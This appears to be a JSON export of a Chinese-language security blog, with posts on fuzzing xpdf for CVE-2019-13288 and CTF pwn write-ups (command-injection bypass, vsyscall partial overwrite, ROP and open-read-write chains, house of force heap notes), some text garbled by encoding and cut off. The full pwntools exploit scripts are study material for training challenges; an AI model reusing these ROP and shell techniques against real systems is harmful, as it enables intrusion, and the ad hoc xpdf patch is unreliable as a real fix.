{"meta":{"title":"your blog title","subtitle":"","description":"","author":"your name","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"xpdf","slug":"FUZZ/xpdf","date":"2024-11-26T12:58:53.000Z","updated":"2024-11-26T17:22:58.940Z","comments":true,"path":"2024/11/26/FUZZ/xpdf/","link":"","permalink":"http://example.com/2024/11/26/FUZZ/xpdf/","excerpt":"","text":"CVE-2019-13288 æ­å»ºxpdfç¯å¢ƒ cd $HOME mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/ # ç›¸å…³ä¾èµ– sudo apt install build-essential sudo apt update &amp;&amp; sudo apt install -y build-essential gcc # Download Xpdf 3.02 &amp;&amp; build Xpdf wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz tar -xvzf xpdf-3.02.tar.gz cd xpdf-3.02 ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; make make install # Download PDF examples to test Xpdf cd $HOME/fuzzing_xpdf mkdir pdf_examples &amp;&amp; cd pdf_examples wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf wget http://www.africau.edu/images/default/sample.pdf wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf æµ‹è¯•Xpdf $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf æ­å»ºfuzzç¯å¢ƒ sudo apt-get update sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#39;s/\\..*//&#39;|sed &#39;s/.* //&#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#39;s/\\..*//&#39;|sed &#39;s/.* //&#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode sudo apt-get install -y cpio libcapstone-dev # for Nyx mode sudo apt-get install -y wget curl # for Frida mode sudo apt-get install -y python3-pip # for Unicorn mode git clone https://github.com/AFLplusplus/AFLplusplus cd AFLplusplus make distrib sudo make install #å°†aflæ·»åŠ åˆ°ç¯å¢ƒå˜é‡pathä¸­ echo &#39;export PATH=$PATH:/home/hpp/AFLplusplus&#39; &gt;&gt; ~/.bashrc source ~/.bashrc ä½¿ç”¨afl-clang-fastå¯¹Xpdfè¿›è¡Œæ’æ¡© å…ˆæ¸…ç†æ‰ä¹‹å‰Xpdfç¼–è¯‘å¥½çš„æ–‡ä»¶ rm -r $HOME/fuzzing_xpdf/install cd $HOME/fuzzing_xpdf/xpdf-3.02/ make clean ç¼–è¯‘xpdfå¹¶ç”¨ afl-clang-fast ç¼–è¯‘å™¨ï¼Œè¿›è¡Œæ’æ¡© export LLVM_CONFIG=&quot;llvm-config-11&quot; CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; make make install å¼€å§‹fuzzæ¨¡ç³Šæµ‹è¯• -i :è®¾ç½®è¾“å…¥å®ä¾‹çš„æ–‡ä»¶å¤¹ -o :è®¾ç½®ç”¨äºå­˜æ”¾æ¨¡ç³Šæµ‹è¯•ç»“æœçš„æ–‡ä»¶å¤¹ -s :è®¾ç½®ä¸€ä¸ªé™æ€éšæœºæ•°ä½œä¸ºç§å­ â€” ï¼šè®¾ç½®æµ‹è¯•ç›®æ ‡ @@ ï¼šå ä½ç¬¦ï¼ŒæŒ‡ä»£æ¯ä¸€ä¸ªè¾“å…¥æ–‡ä»¶ afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdftotext @@ $HOME/fuzzing_xpdf/output åœ¨ ~/fuzzing_xpdf/out/default/crashes é‡Œæœ‰å¯¼è‡´ç¨‹åºå¥”æºƒçš„è¾“å…¥ hpp@swikar:~/fuzzing_xpdf/out/default/crashes$ ls id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15 id:000001,sig:11,src:000229,time:505563,execs:344967,op:havoc,rep:2 id:000002,sig:11,src:001638,time:566771,execs:383537,op:havoc,rep:1 id:000003,sig:11,src:001753+000851,time:820662,execs:526503,op:splice,rep:2 README.txt å°†è¿™äº›æ–‡ä»¶æ”¾åˆ°gdbä¸­è°ƒè¯•ï¼Œçœ‹çœ‹æ˜¯å“ªé‡Œå‡ºé”™ é¦–å…ˆé‡æ–°ç¼–è¯‘ rm -r $HOME/fuzzing_xpdf/install cd $HOME/fuzzing_xpdf/xpdf-3.02/ make clean CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; make make install ç„¶ågdbè°ƒè¯• gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output æˆ‘è¿™é‡Œæ˜¯ gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15 $HOME/fuzzing_xpdf/output pwndbg&gt; run #å›æº¯ç”¨è¿‡çš„å‡½æ•° pwndbg&gt; bt #24055 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b1030, dict=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156 #24056 0x00005555555ff51a in Parser::getObj (this=0x5555561b1030, obj=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94 #24057 0x0000555555623714 in XRef::fetch (this=0x5555556cc230, num=7, gen=0, obj=0x7fffffa71880) at XRef.cc:823 #24058 0x00005555555fa57e in Object::fetch (this=0x5555561b0c58, xref=0x5555556cc230, obj=0x7fffffa71880) at Object.cc:106 #24059 0x000055555559c94c in Dict::lookup (this=0x5555561b0c00, key=0x55555564ca6f &quot;Length&quot;, obj=0x7fffffa71880) at Dict.cc:76 #24060 0x00005555555fb269 in Object::dictLookup (this=0x7fffffa71b00, key=0x55555564ca6f &quot;Length&quot;, obj=0x7fffffa71880) at /home/hpp/fuzzing_xpdf/xpdf-3.02/xpdf/Object.h:253 #24061 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b0b50, dict=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156 #24062 0x00005555555ff51a in Parser::getObj (this=0x5555561b0b50, obj=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94 # å‘ç°ä¸€ç›´åœ¨è°ƒç”¨Parser::getObj å‡½æ•° æŸ¥çœ‹Parser.cc:94çš„æºç  while (!buf1.isCmd(&quot;&gt;&gt;&quot;) &amp;&amp; !buf1.isEOF()) &#123; if (!buf1.isName()) &#123; error(getPos(), &quot;Dictionary key must be a name object&quot;); shift(); &#125; else &#123; key = copyString(buf1.getName()); shift(); if (buf1.isEOF() || buf1.isError()) &#123; gfree(key); break; &#125; //ä¸æ–­è°ƒç”¨getObjä½¿ç¨‹åºå¥”æºƒ obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength, objNum, objGen)); &#125; &#125; å®šä½åˆ°è¿™ ç”±äºæœ¬äººä»£ç èƒ½åŠ›ä¸€èˆ¬ï¼Œä¿®å¤ä¸äº†bug,é€šè¿‡chatgptä¿®å¤äº†ä¸€ä¸‹ åœ¨æºç çš„åŸºç¡€ä¸Šå¢åŠ äº†ä¸€ä¸ªæ¬¡æ•°çš„é™åˆ¶ //å®šä¹‰ä¸¤ä¸ªå…¨å±€å˜é‡ #define MAX_OBJ_CALLS 10000 int callCount = 0; while (!buf1.isCmd(&quot;&gt;&gt;&quot;) &amp;&amp; !buf1.isEOF()) &#123; if (!buf1.isName()) &#123; error(getPos(), &quot;Dictionary key must be a name object&quot;); shift(); &#125; else &#123; key = copyString(buf1.getName()); shift(); if (buf1.isEOF() || buf1.isError()) &#123; gfree(key); break; &#125; // å¢åŠ è°ƒç”¨æ¬¡æ•°é™åˆ¶ if (callCount &gt;= MAX_OBJ_CALLS) &#123; error(getPos(), &quot;Too many calls to getObj, possible infinite loop&quot;); gfree(key); obj-&gt;initError(); // åˆå§‹åŒ–ä¸ºé”™è¯¯å¯¹è±¡ break; &#125; callCount++; // å¢åŠ è°ƒç”¨æ¬¡æ•° obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength, objNum, objGen)); &#125; &#125; è¿™æ ·å¯ä»¥æœ‰æ•ˆé™åˆ¶è°ƒç”¨æ¬¡æ•° å†æ¬¡make clean,é‡æ–°æ’æ¡©ç¼–è¯‘ï¼Œå› ä¸ºè¾“å…¥è€Œå¯¼è‡´ç¨‹åºå¥”æºƒçš„bugå·²ç»æ²¡æœ‰äº†ï¼Œä½†æ˜¯è·‘äº†å¾ˆä¹…å‘ç°äº†å¦å¤–ä¸€ä¸ªâ€¦â€¦æœ‰ç©ºå†çœ‹çœ‹å§ è¿™æ˜¯xpdf4.02ä¸­Parser.ccçš„éƒ¨åˆ†æºç  // å¢åŠ äº†é€’å½’çš„ä¸Šé™ // Max number of nested objects. This is used to catch infinite loops // in the object structure. #define recursionLimit 500 // å¢åŠ äº†é€’å½’æ¬¡æ•°çš„æ£€æŸ¥ // array if (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(&quot;[&quot;)) &#123; ... // dictionary or stream &#125; else if (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(&quot;&lt;&lt;&quot;)) &#123; ... // å¯¹æ¯”ä¹‹å‰ç‰ˆæœ¬ï¼Œå‘ç°å¤šäº† recursion è¿™ä¸ªå‚æ•° // stream objects are not allowed inside content streams or // object streams if (allowStreams &amp;&amp; buf2.isCmd(&quot;stream&quot;)) &#123; if ((str = makeStream(obj, fileKey, encAlgorithm, keyLength, objNum, objGen, recursion + 1))) &#123; ... æ¼æ´æ¥æº åœ¨ Xpdf 4.01.01 ä¸­ï¼ŒParser.cc æ–‡ä»¶ä¸­çš„ Parser::getObj() å‡½æ•°å¯èƒ½é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ–‡ä»¶å¯¼è‡´æ— é™é€’å½’ã€‚è¿œç¨‹æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å‘åŠ¨æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚æ­¤æ¼æ´ä¸ CVE-2018-16646 ç±»ä¼¼ã€‚ å‚è€ƒæ–‡çŒ®[1]:Fuzzing101å­¦ä¹ ç¬”è®° - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ [2]:Fuzzing101/Exercise 1 at main Â· antonio-morales/Fuzzing101 [3]:CVE-2019-13288 : In Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite r","categories":[],"tags":[]},{"title":"trick","slug":"trick","date":"2024-11-20T14:03:02.000Z","updated":"2024-11-20T14:54:04.451Z","comments":true,"path":"2024/11/20/trick/","link":"","permalink":"http://example.com/2024/11/20/trick/","excerpt":"","text":"ctfshow å•èº«æ¯Findyourgirlfriendstrstrå‡½æ•°è¿”å›å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„æŒ‡é’ˆï¼Œç„¶åè¿™é‡Œå³è¾¹æ˜¯åˆ¤æ–­ï¼Œè¿”å›0æˆ–1 è¾“å…¥çš„sä¸èƒ½åŒ…å«è¿™äº›å­—ç¬¦ä¸²ï¼Œç„¶åè¾“å…¥çš„sæ˜¯ set -s, æœ€åæ‰§è¡Œçš„æ˜¯system(â€˜/bin/sh -c set -s),åœ¨shå†…æ‰§è¡Œset -s,è®¾ç½®äº†shellè¾“å‡ºé€‰é¡¹è€Œæ²¡æœ‰å…¶ä»–åŠ¨ä½œ è¿™é‡Œä¸èƒ½ç›´æ¥catï¼Œå› ä¸ºè¿œç¨‹ç¯å¢ƒæ²¡æœ‰ç»™catè®¾ç½®ç¯å¢ƒå˜é‡$PATH from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28147) p=process(&quot;./girl&quot;) context.log_level=&quot;debug&quot; def dbg(): gdb.attach(p) sleep(1) p.sendlineafter(&#39;games&#39;,&#39;1&#39;) payload=b&#39;set -s&#39; p.sendlineafter(&#39;girlfriend? &#39;,payload) p.sendline(&#39;/bin/cat /flag&#39;) p.interactive() CheckInä¿æŠ¤å…¨å¼€ï¼Œæœ‰ä¸ªåé—¨å‡½æ•° raxåœ¨æ ˆä¸Š è¿™é‡Œç”¨äº†vsyscallï¼Œåœ¨è¿™é‡Œx64è¿™æ˜¯å›ºå®šçš„åœ°å€ è®¾è®¡è¿™ç©æ„çš„åˆè¡·æ˜¯é™åˆ¶äº†åªæœ‰ä»vsyscallå‡½æ•°å…¥å£æ‰èƒ½æ­£å¸¸è¿è¡Œï¼Œé¿å…gadgetï¼Œè¿™é‡Œæ˜¯åå¤è°ƒç”¨vsyscallä¸æ–­è°ƒç”¨retç ´åæ ˆï¼Œå…·ä½“è°ƒè¯•ä¸å‡ºæ¥ï¼Œç›´æ¥æŠ¥é”™äº†ï¼Œåªæœ‰æ ˆä¸Šæœ‰.textæ®µæ²¡æ¸…ç†å¹²å‡€ï¼Œä¿®æ”¹æœ€ä½ä½å°±åŠ«æŒäº†æ§åˆ¶æµ from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28149) p=process(&quot;./1&quot;) context.log_level=&quot;debug&quot; ret=0xffffffffff600000 gdb.attach(p) pause() p.send(p64(ret)*30+b&#39;\\x13&#39;) p.sendline(&#39;/bin/sh&#39;) p.interactive()","categories":[],"tags":[]},{"title":"trick","slug":"trick/trick","date":"2024-11-20T14:03:02.000Z","updated":"2024-11-20T14:54:04.451Z","comments":true,"path":"2024/11/20/trick/trick/","link":"","permalink":"http://example.com/2024/11/20/trick/trick/","excerpt":"","text":"ctfshow å•èº«æ¯Findyourgirlfriendstrstrå‡½æ•°è¿”å›å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„æŒ‡é’ˆï¼Œç„¶åè¿™é‡Œå³è¾¹æ˜¯åˆ¤æ–­ï¼Œè¿”å›0æˆ–1 è¾“å…¥çš„sä¸èƒ½åŒ…å«è¿™äº›å­—ç¬¦ä¸²ï¼Œç„¶åè¾“å…¥çš„sæ˜¯ set -s, æœ€åæ‰§è¡Œçš„æ˜¯system(â€˜/bin/sh -c set -s),åœ¨shå†…æ‰§è¡Œset -s,è®¾ç½®äº†shellè¾“å‡ºé€‰é¡¹è€Œæ²¡æœ‰å…¶ä»–åŠ¨ä½œ è¿™é‡Œä¸èƒ½ç›´æ¥catï¼Œå› ä¸ºè¿œç¨‹ç¯å¢ƒæ²¡æœ‰ç»™catè®¾ç½®ç¯å¢ƒå˜é‡$PATH from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28147) p=process(&quot;./girl&quot;) context.log_level=&quot;debug&quot; def dbg(): gdb.attach(p) sleep(1) p.sendlineafter(&#39;games&#39;,&#39;1&#39;) payload=b&#39;set -s&#39; p.sendlineafter(&#39;girlfriend? &#39;,payload) p.sendline(&#39;/bin/cat /flag&#39;) p.interactive() CheckInä¿æŠ¤å…¨å¼€ï¼Œæœ‰ä¸ªåé—¨å‡½æ•° raxåœ¨æ ˆä¸Š è¿™é‡Œç”¨äº†vsyscallï¼Œåœ¨è¿™é‡Œx64è¿™æ˜¯å›ºå®šçš„åœ°å€ è®¾è®¡è¿™ç©æ„çš„åˆè¡·æ˜¯é™åˆ¶äº†åªæœ‰ä»vsyscallå‡½æ•°å…¥å£æ‰èƒ½æ­£å¸¸è¿è¡Œï¼Œé¿å…gadgetï¼Œè¿™é‡Œæ˜¯åå¤è°ƒç”¨vsyscallä¸æ–­è°ƒç”¨retç ´åæ ˆï¼Œå…·ä½“è°ƒè¯•ä¸å‡ºæ¥ï¼Œç›´æ¥æŠ¥é”™äº†ï¼Œåªæœ‰æ ˆä¸Šæœ‰.textæ®µæ²¡æ¸…ç†å¹²å‡€ï¼Œä¿®æ”¹æœ€ä½ä½å°±åŠ«æŒäº†æ§åˆ¶æµ from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28149) p=process(&quot;./1&quot;) context.log_level=&quot;debug&quot; ret=0xffffffffff600000 gdb.attach(p) pause() p.send(p64(ret)*30+b&#39;\\x13&#39;) p.sendline(&#39;/bin/sh&#39;) p.interactive()","categories":[],"tags":[]},{"title":"qwnt2024","slug":"qwnt2024","date":"2024-11-18T14:56:02.000Z","updated":"2024-11-25T16:23:09.834Z","comments":true,"path":"2024/11/18/qwnt2024/","link":"","permalink":"http://example.com/2024/11/18/qwnt2024/","excerpt":"","text":"siginå¼€äº†éšæœºç§å­ï¼Œè¾“å…¥è¦å’Œéšæœºæ•°ä¸€æ · ç”±äºbufå’Œseedåœ¨æ ˆä¸Šï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¾“å…¥bufæŠŠseedç»™è¦†ç›–æ‰ ä½¿ç”¨ libc=cdll.LoadLibrary(â€œ./libc.so.6â€) ï¼ŒåŠ è½½çš„å°±æ˜¯ç‰¹å®šçš„libcï¼Œç„¶ååˆ©ç”¨libcçš„å‡½æ•°libc.srand(seed),å¾—åˆ°çš„éšæœºæ•°å’Œrandä¸€æ ·ï¼Œåç»­å°±æ˜¯ç”¨è€å¥—çš„orwå°±èƒ½è§£å†³ï¼Œä¸è¿‡è¦æ ˆè¿ç§»å–å»bssæ®µä¸Šæ‰§è¡Œï¼Œå› ä¸ºåœ¨æ ˆä¸Šçš„ropé•¿åº¦ä¸å¤Ÿ from pwn import* from ctypes import * from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./vuln&quot;) context.log_level=&quot;debug&quot; elf=ELF(&#39;./vuln&#39;) context(arch=&#39;amd64&#39;) #libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;) libc=cdll.LoadLibrary(&quot;./libc.so.6&quot;) # def dbg(): gdb.attach(p) pause() p.send(b&#39;a&#39;*14+p32(1)) libc.srand(1) menu=0x4014E6 for i in range(100): k=libc.rand()%100+1 print(k) p.sendafter(&#39;code:&#39;,p8(k)) pop_rdi=0x401893 p.sendafter(&#39;&gt;&gt;&#39;,p32(1)) p.sendlineafter(&#39;Index: &#39;,p32(0)) payload=b&#39;a&#39;*0x108+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(menu) libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;) p.sendlineafter(&#39;Note: &#39;,payload) puts=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) base=puts-libc.sym[&#39;puts&#39;] pop_rsi=0x202f8+base pop_rdx=0x1b92+base read=base+libc.sym[&#39;read&#39;] op=base+libc.sym[&#39;open&#39;] write=base+libc.sym[&#39;write&#39;] bss=0x4040A0 leave=0x401591 p.sendafter(&#39;Index: &#39;,p32(2)) print(hex(op)) payload=b&#39;b&#39;*0x108+p64(pop_rsi)+p64(bss)+p64(read)+p64(menu) p.sendlineafter(&#39;Note: &#39;,&#39;asdf&#39;) p.sendline(payload) p.sendline(&#39;./flag\\x00&#39;) p.sendlineafter(&#39;Index: &#39;,p32(2)) payload=b&#39;a&#39;*0x108+p64(pop_rsi)+p64(bss+0x200)+p64(read)+p64(menu) p.sendlineafter(&#39;Note: &#39;,payload) #orw payload=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(op) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x200)+p64(pop_rdx)+p64(0x40)+p64(read) payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x200)+p64(pop_rdx)+p64(0x40)+p64(write) p.sendline(payload) dbg() p.sendlineafter(&#39;Index: &#39;,p32(3)) payload=b&#39;d&#39;*0xff+p64(bss+0x200-8)+p64(leave) p.sendafter(&#39;Note: &#39;,&#39;g&#39;*0x100) p.sendline(payload) print(hex(puts)) #leak_base #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"æ²™ç®±","slug":"æ²™ç®±/æ²™ç®±","date":"2024-11-13T13:48:38.000Z","updated":"2024-11-16T12:12:29.050Z","comments":true,"path":"2024/11/13/æ²™ç®±/æ²™ç®±/","link":"","permalink":"http://example.com/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/","excerpt":"","text":"ç›®å‰å¯¹æ²™ç®±ç±»å‹çš„é¢˜å†™ä¸€ä¸‹ï¼Œè¿™å—æ¯”è¾ƒè–„å¼± æœ€å¸¸è§çš„å°±æ˜¯ret2syscalläº†ï¼Œä¸€èˆ¬å¼€äº†æ²™ç®±ï¼Œåªèƒ½ç”¨orw ret2syscallä¸€èˆ¬å¼€äº†ï¼Œç¦ç”¨äº†execve,åªèƒ½ç”¨orwè¯»å‡ºflag æ¥çœ‹ä¸‹å¸¸ç”¨çš„å‡ ä¸ªå‡½æ•°ï¼Œå½“æŠŠbin/shæˆ–./flagè¯»å…¥bssæ—¶ï¼Œreadï¼ˆ0ï¼Œbss,nb)ï¼Œrdi=0ï¼Œrsi=bss,rsi=nb; ç„¶åæ—¶openå‡½æ•°,open(â€˜flagâ€™), rdi=flag_addr(bss),rsi=0; è¯»è¿›bss+0x300,read(3,bss+0x300,nb),rdi=3,rsi=bss+0x300,rsi=nb; è¯»å‡ºflag ï¼Œwrite(1,bss+0x300,nb), rdi=1,rsi=bss+0x300,rsi=nb; é‡è¿‡ä¸€æ¬¡å‘å°±æ˜¯ï¼Œå½“æŠŠflagå­—ç¬¦å†™è¿›bssæ—¶ï¼Œå­—ç¬¦ä¸²åº”è¯¥æ—¶p.sendline(â€˜./flag\\x00â€™),åé¢å¿…é¡»æ˜¯ç©ºæ ¼ï¼Œå¦åˆ™openå‡½æ•°æ˜¯ä»¥åŠ äº†\\næ¥æ‰¾flagæ–‡ä»¶ï¼Œæ˜¯æ‰¾ä¸åˆ°çš„ï¼Œæ‰€ä»¥å¾—åŠ ç©ºæ ¼ å¸¸ç”¨çš„exp from pwn import* from LibcSearcher import * #p=remote(&quot;27.25.151.12&quot;,33424) p=process(&quot;./ret2orw&quot;) elf=ELF(&#39;ret2orw&#39;) #libc=ELF(&#39;libc.so.6&#39;) libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) context.log_level=&quot;debug&quot; pop_rdi=0x4012CE payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(0x4012A1) #sleep(1) p.sendlineafter(&#39;this?&#39;,payload) puts=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) print(hex(puts)) base=puts-libc.sym[&#39;puts&#39;] def dbg(): gdb.attach(p) pause() pop_rsi=base+0x2be51 pop_rdx=base+0x11f497 bss=0x404060 read=base+libc.sym[&#39;read&#39;] write=base+libc.sym[&#39;write&#39;] op=base+libc.sym[&#39;open&#39;] print(&#39;read&#39;+hex(read)) payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(0)+p64(read)+p64(0x4012A1) p.sendline(payload) p.sendline(&#39;./flag&#39;) dbg() payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(op)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx)+p64(60)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx)+p64(60)+p64(0)+p64(write) p.sendline(payload) print(&#39;pop_rsi&#39;+hex(pop_rsi)) p.interactive()","categories":[],"tags":[]},{"title":"200~house_of_force","slug":"house-of-force","date":"2024-11-03T10:14:32.000Z","updated":"2024-11-04T14:32:48.996Z","comments":true,"path":"2024/11/03/house-of-force/","link":"","permalink":"http://example.com/2024/11/03/house-of-force/","excerpt":"","text":"åˆ©ç”¨æ¡ä»¶ï¼šèƒ½æ§åˆ¶topchunk_sizeï¼Œèƒ½å¤Ÿè‡ªç”±æ§åˆ¶ç”³è¯·çš„å †å—å¤§å°ã€‚éœ€è¦çŸ¥é“top_chunkåœ°å€ä¸ç›®çš„åœ°å€çš„åç§»é‡ï¼Œå¦‚æœè¿˜ä¸å¯¹é½ï¼Œå³ç»“æœä¸æ˜¯0x0ç»“å°¾ï¼Œéœ€è¦å¤šå‡8ï¼Œç„¶åå‡å»SIZE_SZï¼ˆ8ï¼‰ ç»“æœï¼šèƒ½å°†topcunkçš„åœ°å€æ§åˆ¶åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œå†ç”³è¯·å†…å­˜å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€çš„å€¼ã€‚ check1å¯¹topchunk_sizeçš„æ£€æŸ¥ï¼Œ(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE) // è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å° victim = av-&gt;top; size = chunksize(victim); // å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; #è®¾ç½®top_chunkçš„å¤´ï¼Œé™„è¿‘å€¼ä¼šæœ‰æ‰€å˜åŒ– set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; æ‰€ä»¥æŠŠsizeæ”¹ä¸º-1ï¼Œåœ¨è¡¥ç ä¸­ä¸ºå¾ˆå¤§çš„æ•°ï¼Œèƒ½å¤Ÿæ»¡è¶³æ¡ä»¶ æ–°çš„remainderå³top_chunkçš„åœ°å€ **remainder = chunk_at_offset(victim, nb);**ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»check2å¯¹ç”³è¯·çš„sizeçš„æ£€æŸ¥ /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #è¿™é‡Œçš„reqå³æ˜¯nb.å¯¹reqçš„å¤§å°çš„æ£€æŸ¥ï¼Œ((unsigned long) (req)è¦å°äº (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 # å¯¹nbåŠ  SIZE_SZåŠ  MALLOC_ALIGN_MASK,æœ€åå’ŒMALLOC_ALIGN_MASKæŒ‰ä½ä¸å¯¹é½,è¿™é‡Œçš„SIZE_SZæ˜¯8 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ # reqä¸èƒ½å¤§äº -2 * MINSIZEï¼Œå¦åˆ™ä¼šæŠ¥é”™ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) &#123; \\ __set_errno(ENOMEM); \\ return 0; \\ &#125; \\ (sz) = request2size(req); é¦–å…ˆ ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 MINSIZE))ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„ **-2 MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE*ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº(req) + 